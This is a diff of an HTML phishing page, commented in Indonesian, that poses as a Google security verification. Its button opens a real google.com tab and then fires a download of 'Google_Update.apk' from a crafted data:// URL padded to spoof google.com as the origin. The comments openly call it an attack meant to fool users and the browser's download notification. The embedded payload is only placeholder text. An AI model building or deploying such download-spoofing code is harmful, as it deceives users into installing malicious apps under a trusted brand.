@@ -3,43 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Keamanan Google</title>
+    <title>Google Security Verification</title>
     <style>
         body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; margin: 0; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
     </style>
 </head>
 <body>
 
-    <button class="btn" onclick="startSeamlessAttack()">Verifikasi Akun Google</button>
+    <button class="btn" onclick="triggerSeamless()">Verifikasi Perangkat Google</button>
 
     <script>
-        function startSeamlessAttack() {
-            console.log("[*] Memulai serangan Race Condition...");
+        function triggerSeamless() {
+            console.log("[*] Inisialisasi serangan...");
 
-            // 1. Persiapkan Payload (Abhishek Method)
-            // Pakai Authority //google.com agar parser notifikasi tertipu
-            const padding = "A".repeat(120); 
+            // 1. Buat Payload (Gunakan Data URI Abhishek Kumar)
+            const padding = "A".repeat(150); 
             const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
-            const fileName = "Google_Security_Update.apk";
+            const fileName = "Google_Update.apk";
 
-            // 2. Trigger Navigasi ke Google Asli
-            // Ini biar user ngeliat bar URL isinya "google.com" yang asli
-            window.location.href = "https://www.google.com";
+            // 2. Buka Tab Google yang Asli
+            // Ini biar user ngeliat domain "google.com" di address bar mereka
+            window.open("https://www.google.com", "_blank");
 
-            // 3. THE RACE: Kirim download saat browser sedang sibuk navigasi
-            // Kita kasih delay sangat tipis (100-300ms) agar download terdaftar 
-            // saat renderer 'google.com' mulai aktif.
+            // 3. THE HIJACK: Download ditembak dari tab ini
+            // Kita kasih delay 500ms biar tab Google keburu kebuka duluan
             setTimeout(() => {
-                const a = document.createElement('a');
-                a.href = dataUrl;
-                a.download = fileName;
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
+                const link = document.createElement("a");
+                link.href = dataUrl;
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
                 
-                console.log("[+] Download ditembak saat navigasi!");
-            }, 150); 
+                console.log("[+] Download dikirim ke bar notifikasi.");
+            }, 500);
         }
     </script>
 </body>
